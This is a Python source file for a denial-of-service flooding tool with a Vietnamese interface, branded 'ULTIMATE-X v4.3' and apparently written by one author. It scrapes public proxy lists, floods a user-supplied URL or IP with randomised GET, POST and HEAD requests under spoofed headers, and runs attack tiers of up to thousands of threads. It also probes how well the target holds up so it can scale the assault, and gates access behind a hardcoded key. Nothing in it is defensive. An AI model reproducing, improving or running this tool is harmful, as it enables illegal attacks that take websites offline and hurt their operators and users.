#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
from colorama import init, Fore, Back, Style
import socket
import ssl
import http.client
import aiohttp
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

# Initialize colorama
init()

# Fallback ANSI codes
try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        CYAN = '\033[96m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        BLACK = '\033[40m'
        BLUE = '\033[44m'
        CYAN = '\033[46m'
        RESET = '\033[0m'

    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

PROXY_LIST = []
PROXY_API_URLS = [
    "http://pubproxy.com/api/proxy?limit=20&format=json&type=http",
    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=86400",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
]
PROXY_REFRESH_INTERVAL = 300  # Refresh proxies every 5 minutes

POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

TARGET_CONFIGS = [
    {"id": "1", "name": "100k", "category": "Light", "threads": 100, "requests": 1000, "desc": "100K Requests", "level": "Thấp", "application": "Kiểm tra cơ bản"},
    {"id": "2", "name": "500k", "category": "Light", "threads": 200, "requests": 2500, "desc": "500K Requests", "level": "Thấp", "application": "Kiểm tra nhẹ"},
    {"id": "3", "name": "10m", "category": "Medium", "threads": 500, "requests": 20000, "desc": "10M Requests", "level": "Trung bình", "application": "Tấn công vừa"},
    {"id": "4", "name": "40m", "category": "Medium", "threads": 1000, "requests": 40000, "desc": "40M Requests", "level": "Trung bình", "application": "Tấn công trung bình"},
    {"id": "5", "name": "70m", "category": "Heavy", "threads": 2000, "requests": 35000, "desc": "70M Requests", "level": "Cao", "application": "Tấn công mạnh"},
    {"id": "6", "name": "100m", "category": "Heavy", "threads": 3000, "requests": 33334, "desc": "100M Requests", "level": "Cao", "application": "Tấn công lớn"},
    {"id": "7", "name": "200m", "category": "Extreme", "threads": 5000, "requests": 40000, "desc": "200M Requests", "level": "Rất Cao", "application": "Tấn công quy mô"},
    {"id": "8", "name": "500m", "category": "Extreme", "threads": 10000, "requests": 50000, "desc": "500M Requests", "level": "Cực Cao", "application": "Tấn công siêu lớn"},
    {"id": "9", "name": "700m", "category": "Extreme", "threads": 15000, "requests": 46667, "desc": "700M Requests", "level": "Cực Cao", "application": "Tấn công tối đa"},
]

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
status_codes = []
EXPECTED_HASH = None
last_proxy_refresh = 0
current_threads = 0

# Proxy Management Functions
def fetch_proxies():
    global PROXY_LIST, last_proxy_refresh
    PROXY_LIST.clear()
    for api_url in PROXY_API_URLS:
        try:
            response = requests.get(api_url, timeout=5)
            response.raise_for_status()
            if api_url in PROXY_API_URLS[:4]:
                data = response.json() if api_url != PROXY_API_URLS[2] else response.text.splitlines()
                if api_url == PROXY_API_URLS[0]:  # pubproxy.com
                    if data.get('count', 0) > 0:
                        for proxy in data['data']:
                            if proxy['type'] == 'http' and proxy['support']['get']:
                                proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
                                PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
                elif api_url == PROXY_API_URLS[1]:  # getproxylist.com
                    proxy_url = f"http://{data['ip']}:{data['port']}"
                    PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
                elif api_url == PROXY_API_URLS[2]:  # proxy-list.download
                    for line in data:
                        if line:
                            ip, port = line.split(':')
                            proxy_url = f"http://{ip}:{port}"
                            PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
                elif api_url == PROXY_API_URLS[3]:  # geonode.com
                    if data.get('total', 0) > 0:
                        for proxy in data['data']:
                            proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
                            PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
            else:  # GitHub raw proxy lists
                for line in response.text.splitlines():
                    if line.strip():
                        ip, port = line.split(':')[:2]
                        proxy_url = f"http://{ip}:{port}"
                        PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
            print(f"{Fore.GREEN}✅ [PROXY] Đã lấy {len(PROXY_LIST)} proxy từ {api_url}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}🚨 [PROXY] Lỗi khi lấy proxy từ {api_url}: {str(e)}{Fore.RESET}")
    if PROXY_LIST:
        last_proxy_refresh = time.time()
        print(f"{Fore.GREEN}✅ [PROXY] Tổng cộng {len(PROXY_LIST)} proxy đã được lấy{Fore.RESET}")
        return True
    else:
        print(f"{Fore.RED}🚨 [PROXY] Không lấy được proxy từ bất kỳ API nào{Fore.RESET}")
        return False

def validate_proxy(proxy):
    try:
        test_url = "http://example.com"
        response = requests.get(test_url, proxies=proxy, timeout=3)
        return response.status_code == 200
    except Exception:
        return False

def refresh_proxies_if_needed():
    global last_proxy_refresh, PROXY_LIST
    if time.time() - last_proxy_refresh > PROXY_REFRESH_INTERVAL or not PROXY_LIST:
        print(f"{Fore.YELLOW}🔄 [PROXY] Đang làm mới danh sách proxy...{Fore.RESET}")
        loading_animation("Lấy proxy từ API", 1)
        if fetch_proxies():
            valid_proxies = []
            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_proxy = {executor.submit(validate_proxy, proxy): proxy for proxy in PROXY_LIST}
                for future in as_completed(future_to_proxy):
                    proxy = future_to_proxy[future]
                    if future.result():
                        valid_proxies.append(proxy)
            PROXY_LIST.clear()
            PROXY_LIST.extend(valid_proxies)
            print(f"{Fore.GREEN}✅ [PROXY] Đã giữ lại {len(PROXY_LIST)} proxy hoạt động{Fore.RESET}")
            if not PROXY_LIST:
                print(f"{Fore.RED}🚨 [PROXY] Không có proxy nào hoạt động, sử dụng kết nối trực tiếp{Fore.RESET}")

def get_random_proxy():
    refresh_proxies_if_needed()
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Utility Functions
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text="Chuẩn bị triển khai", duration=2):
    print(f"{Fore.RED}{Style.BRIGHT}🚀 [HỆ THỐNG] {text}...{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}█{Fore.RESET}", end="", flush=True)
        time.sleep(duration / 3)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}✅ [HỆ THỐNG] {text} - Hoàn tất!{Style.RESET_ALL}{Fore.RESET}")

def typing_effect(text, delay=0.005):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN]
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        print(f"{color}{Style.BRIGHT}⚡{char}{Style.RESET_ALL}", end='', flush=True)
        time.sleep(delay)
    print(Fore.RESET)

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                print(f"{Fore.YELLOW}🔒 [HỆ THỐNG] Tạo mã băm mới: {file_hash}{Fore.RESET}")
            elif file_hash != EXPECTED_HASH:
                print(f"{Fore.RED}🚨 [LỖI NGHIÊM TRỌNG] Tệp bị thay đổi! Thoát.{Fore.RESET}")
                exit(1)
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI NGHIÊM TRỌNG] Kiểm tra tính toàn vẹn thất bại: {str(e)}{Fore.RESET}")
        exit(1)

def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
    }

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: {e}")

def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        print(f"{Fore.YELLOW}💾 [HỆ THỐNG] Cấu hình tấn công liên tục đã lưu: {url}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI] Không thể lưu cấu hình tấn công: {str(e)}{Fore.RESET}")

def generate_key_hash(key):
    secret = "QUANGBAO2025ULTIMATE"
    return hashlib.sha512((secret + key).encode()).hexdigest()

def validate_key():
    VALID_KEY = "baoddos"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3
    while attempts < max_attempts:
        clear_screen()
        display_banner()
        print(f"{Fore.YELLOW}🔑 Nhập mã truy cập: {Fore.WHITE}", end="")
        user_key = input().strip()
        loading_animation("Xác minh thông tin", 1)
        if generate_key_hash(user_key) == VALID_KEY_HASH:
            print(f"{Fore.GREEN}{Style.BRIGHT}✅ [HỆ THỐNG] Truy cập được cấp! Hệ thống kích hoạt.{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}{Style.BRIGHT}🚨 [HỆ THỐNG] Mã không hợp lệ! Còn {remaining} lần thử.{Style.RESET_ALL}{Fore.RESET}")
            if remaining == 0:
                print(f"{Fore.RED}{Style.BRIGHT}🔒 [HỆ THỐNG] Truy cập bị khóa!{Style.RESET_ALL}{Fore.RESET}")
                return False
            time.sleep(1)

def assess_target_security(url):
    session = requests.Session()
    try:
        response_times = []
        status_codes = []
        for _ in range(10):
            start_time = time.perf_counter()
            try:
                response = session.get(url, headers=generate_random_headers(), proxies=get_random_proxy(), timeout=3)
                end_time = time.perf_counter()
                response_times.append((end_time - start_time) * 1000)
                status_codes.append(response.status_code)
            except requests.exceptions.RequestException:
                break
            time.sleep(0.05)
        if not response_times:
            print(f"{Fore.RED}🚨 [LỖI] Không thể kết nối mục tiêu{Fore.RESET}")
            return "CAO", 200, 1000
        avg_response_time = sum(response_times) / len(response_times)
        error_rate = sum(1 for code in status_codes if code in (429, 503, 522)) / len(status_codes)
        security_score = 0
        if avg_response_time < 500:
            security_score += 30
        if error_rate < 0.1:
            security_score += 20
        if security_score < 50:
            security_level = "THẤP"
            recommended_threads = 100
            recommended_requests = 1000
            print(f"{Fore.GREEN}🛡️ [KẾT QUẢ] Mục tiêu: Bảo mật thấp - Dễ tấn công{Fore.RESET}")
        elif security_score < 80:
            security_level = "TRUNG BÌNH"
            recommended_threads = 200
            recommended_requests = 2500
            print(f"{Fore.YELLOW}🛡️ [KẾT QUẢ] Mục tiêu: Bảo mật trung bình - Cần lực lượng vừa phải{Fore.RESET}")
        else:
            security_level = "CAO"
            recommended_threads = 500
            recommended_requests = 5000
            print(f"{Fore.RED}🛡️ [KẾT QUẢ] Mục tiêu: Bảo mật cao - Cần lực lượng tối đa{Fore.RESET}")
        return security_level, recommended_threads, recommended_requests
    except Exception as e:
        print(f"{Fore.RED}🚨 [LỖI] Lỗi nghiêm trọng: {str(e)}{Fore.RESET}")
        return "CAO", 200, 1000

def adjust_threads(base_threads, status_codes, response_times):
    global current_threads
    if not status_codes or not response_times:
        return base_threads
    status_counter = Counter(status_codes[-100:])  # Analyze last 100 requests
    total = sum(status_counter.values())
    error_rate = sum(status_counter[code] for code in (429, 503, 522)) / total if total > 0 else 0
    avg_response_time = sum(response_times[-100:]) / len(response_times[-100:]) if response_times else 1000
    success_rate = status_counter[200] / total if total > 0 and 200 in status_counter else 0
    
    if error_rate > 0.3:
        new_threads = max(50, base_threads // 2)
        print(f"{Fore.YELLOW}⚠ [HỆ THỐNG] Phát hiện lỗi {error_rate*100:.1f}% (429/503/522), giảm luồng xuống {new_threads}{Fore.RESET}")
    elif success_rate > 0.8 and avg_response_time < 500:
        new_threads = min(base_threads * 2, multiprocessing.cpu_count() * 100)
        print(f"{Fore.GREEN}🚀 [HỆ THỐNG] Tỷ lệ thành công {success_rate*100:.1f}%, thời gian phản hồi {avg_response_time:.1f}ms, tăng luồng lên {new_threads}{Fore.RESET}")
    else:
        new_threads = base_threads
    current_threads = new_threads
    return new_threads

# Attack Function
def send_request(url, request_count, stop_event):
    global success_count, error_count, response_times, status_codes
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    for _ in range(request_count):
        if stop_event.is_set():
            break
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            delay = random.uniform(0, 0.0001)
            time.sleep(delay)
            start_time = time.perf_counter()
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            elif method == "HEAD":
                response = session.head(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            else:
                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
                status_codes.append(response.status_code)
            if response.status_code in (503, 429, 522):
                print(f"{Fore.YELLOW}⚡ [TẤN CÔNG] {method} Tấn công: Mã trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG QUÁ TẢI{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}⚡ [TẤN CÔNG] {method} Tấn công: Mã trạng thái {response.status_code} | Thời gian: {response_time:.2f}ms | Mục tiêu: ĐANG CHỊU ÁP LỰC{Fore.RESET}")
        except requests.exceptions.RequestException as e:
            with manager:
                error_count += 1
                status_codes.append(0)
            print(f"{Fore.RED}🚨 [TẤN CÔNG THẤT BẠI] Lỗi: {str(e)}{Fore.RESET}")
            if "proxy" in str(e).lower():
                refresh_proxies_if_needed()
        except Exception as e:
            with manager:
                error_count += 1
                status_codes.append(0)
            print(f"{Fore.RED}🚨 [TẤN CÔNG THẤT BẠI] Lỗi: {str(e)}{Fore.RESET}")
            if "proxy" in str(e).lower():
                refresh_proxies_if_needed()

# UI Functions
def display_banner():
    banner = [
        f"{Fore.RED}{Style.BRIGHT}╔════════════════════════════════════════════════════╗{Style.RESET_ALL}",
        f"{Fore.RED}║ 💀 ULTIMATE-X v4.3 - QUANG BẢO © 2025              ║{Style.RESET_ALL}",
        f"{Fore.RED}║ 🚀 GIAO THỨC: QUANG BAO PROTOCOL v3.3              ║{Style.RESET_ALL}",
        f"{Fore.RED}║ 🛡️ MỌI QUYỀN ĐƯỢC BẢO LƯU                           ║{Style.RESET_ALL}",
        f"{Fore.RED}╚════════════════════════════════════════════════════╝{Style.RESET_ALL}",
        f"{Fore.CYAN} Hành động trong im lặng, chiến thắng trong bóng tối{Style.RESET_ALL}"
    ]
    clear_screen()
    for line in banner:
        typing_effect(line, delay=0.005)
    time.sleep(0.5)

def display_target_menu():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}┌───────[ CHIẾN LƯỢC TẤN CÔNG ]───────┐{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}│ 0. 📋 Xem chi tiết chiến lược         │{Fore.RESET}")
    print(f"{Fore.CYAN}├{'─' * 37}┤{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}│ {'ID':<4} │ {'Tên':<12} │ {'Mô tả':<15} │ {'Cấp độ':<10} │{Fore.RESET}")
    print(f"{Fore.CYAN}├{'─' * 37}┤{Style.RESET_ALL}")
    for target in TARGET_CONFIGS:
        print(f"{Fore.YELLOW}│ {target['id']:<4} │ {target['name'][:12]:<12} │ {target['desc'][:15]:<15} │ {target['level'][:10]:<10} │{Fore.RESET}")
    print(f"{Fore.CYAN}└{'─' * 37}┘{Style.RESET_ALL}")
    print(f"{Fore.CYAN}© Quang Bảo 2025{Fore.RESET}")

def display_ordered_functions():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}┌─────[ CHI TIẾT CHIẾN LƯỢC TẤN CÔNG ]─────┐{Style.RESET_ALL}")
    categories = ["Light", "Medium", "Heavy", "Extreme"]
    for category in categories:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}📂 Danh mục: {category.upper()}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}├{'─' * 43}┤{Fore.RESET}")
        for idx, func in enumerate([f for f in TARGET_CONFIGS if f['category'] == category], 1):
            print(f"{Fore.YELLOW}{idx}. {func['name'].upper()}")
            print(f"   📝 Mô tả: {func['desc']}")
            print(f"   🧵 Luồng: {func['threads']:,}")
            print(f"   📨 Yêu cầu/Luồng: {func['requests']:,}")
            print(f"   💥 Tổng lượt đánh: {func['threads'] * func['requests']:,}")
            print(f"   🌟 Cấp độ: {func['level']}")
            print(f"   🎯 Ứng dụng: {func['application']}{Fore.RESET}\n")
    input(f"{Fore.CYAN}⏎ Nhấn Enter để trở về menu chính...{Fore.RESET}")

def target_selection_effect(target_type):
    frames = [
        f"{Fore.RED}{Style.BRIGHT}🔍 [KHÓA MỤC TIÊU] {target_type.upper()} [20%]...{Style.RESET_ALL}",
        f"{Fore.YELLOW}{Style.BRIGHT}🔍 [KHÓA MỤC TIÊU] {target_type.upper()} [50%]...{Style.RESET_ALL}",
        f"{Fore.CYAN}{Style.BRIGHT}🔍 [KHÓA MỤC TIÊU] {target_type.upper()} [80%]...{Style.RESET_ALL}",
        f"{Fore.GREEN}{Style.BRIGHT}🎯 [MỤC TIÊU ĐÃ KHÓA] {target_type.upper()} [100%]!{Style.RESET_ALL}"
    ]
    for frame in frames:
        clear_screen()
        display_banner()
        print(frame)
        time.sleep(0.3)

# Main Function
def main():
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    refresh_proxies_if_needed()  # Initial proxy fetch
    while True:
        try:
            if not validate_key():
                print(f"{Fore.RED}{Style.BRIGHT}🚨 [HỆ THỐNG] Hủy tấn công - Xác thực thất bại{Style.RESET_ALL}{Fore.RESET}")
                exit(1)

            display_target_menu()
            choice = input(f"{Fore.CYAN}🔢 Nhập lựa chọn (0, 1-9): {Fore.RESET}").strip()

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                print(f"{Fore.RED}🚨 [LỖI] Lựa chọn không hợp lệ! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            base_threads = target['threads']
            base_requests = target['requests']

            input_url = input(f"{Fore.CYAN}🌐 Nhập URL hoặc IP mục tiêu: {Fore.WHITE}").strip()
            if not input_url:
                print(f"{Fore.RED}🚨 [LỖI] URL/IP không được để trống! Thử lại.{Fore.RESET}")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                print(f"{Fore.YELLOW}ℹ [HỆ THỐNG] Xử lý mục tiêu như IP: {host}{Fore.RESET}")

            print(f"{Fore.YELLOW}{Style.BRIGHT}🎯 [HỆ THỐNG] Mục tiêu đã khóa: {validated_url}{Style.RESET_ALL}")

            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "THẤP":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            print(f"""
{Fore.CYAN}{Style.BRIGHT}
┌─────[ CHIẾN LƯỢC TẤN CÔNG ]─────┐
│ 🔧 Kiểu: {target['name'].upper():<20} │
│ 🎯 Mục tiêu: {validated_url:<17} │
│ 🧵 Luồng: {NUM_THREADS:<18} │
│ 📨 Yêu cầu/Luồng: {REQUESTS_PER_THREAD:<10} │
│ ⚙ Chiến lược: {attack_strategy:<12} │
│ 💥 Tổng lượt đánh: {NUM_THREADS * REQUESTS_PER_THREAD:<10} │
│ 🔌 Proxy hoạt động: {len(PROXY_LIST):<10} │
└{'─' * 34}┘
{Style.RESET_ALL}
            """)
            loading_animation("Khởi động tấn công", 2)

            start_time = time.time()
            stop_event = threading.Event()
            global success_count, error_count, response_times, status_codes
            success_count = 0
            error_count = 0
            response_times = []
            status_codes = []

            def thread_wrapper(url, requests_per_thread):
                send_request(url, requests_per_thread, stop_event)

            with ThreadPoolExecutor(max_workers=min(NUM_THREADS, multiprocessing.cpu_count() * 10)) as executor:
                futures = []
                for _ in range(NUM_THREADS):
                    futures.append(executor.submit(thread_wrapper, validated_url, REQUESTS_PER_THREAD))
                
                # Monitor and adjust threads every 10 seconds
                while not all(f.done() for f in futures):
                    time.sleep(10)
                    new_threads = adjust_threads(NUM_THREADS, status_codes, response_times)
                    if new_threads != current_threads:
                        executor._max_workers = new_threads
                        print(f"{Fore.CYAN}🔧 [HỆ THỐNG] Đã điều chỉnh luồng thành {new_threads}{Fore.RESET}")
                    if stop_event.is_set():
                        break

                try:
                    for future in as_completed(futures):
                        future.result()
                except KeyboardInterrupt:
                    stop_event.set()
                    print(f"{Fore.YELLOW}❌ [HỆ THỐNG] Tấn công bị dừng bởi người dùng{Fore.RESET}")
                    executor._threads.clear()
                    exit(0)

            end_time = time.time()
            total_time = end_time - start_time
            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0
            print(f"""
{Fore.CYAN}{Style.BRIGHT}
┌─────[ BÁO CÁO CHIẾN DỊCH: {target['name'].upper()} ]─────┐
│ 💥 Tổng lượt đánh: {(NUM_THREADS * REQUESTS_PER_THREAD):,}       │
│ ✅ Thành công: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%) │
│ ❌ Thất bại: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%) │
│ ⏱ Tổng thời gian: {total_time:.2f} giây                        │
│ 📈 Thời gian phản hồi trung bình: {avg_response_time:.2f}ms     │
│ 🏔 Hiệu suất đỉnh: {max_response_time:.2f}ms                   │
│ 🏞 Độ trễ tối thiểu: {min_response_time:.2f}ms                 │
│ ⚡ Lượt đánh/giây: {(NUM_THREADS * REQUESTS_PER_THREAD)/total_time:.0f} │
│ 🎯 MỤC TIÊU BỊ VÔ HIỆU HÓA!                                  │
└{'─' * 51}┘
{Style.RESET_ALL}
            """)

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}{Style.BRIGHT}❌ [HỆ THỐNG] Tấn công bị dừng bởi người dùng{Style.RESET_ALL}")
            exit(0)
        except Exception as e:
            print(f"{Fore.RED}{Style.BRIGHT}🚨 [HỆ THỐNG] Lỗi nghiêm trọng: {str(e)}{Style.RESET_ALL}")
            exit(1)

if __name__ == "__main__":
    main()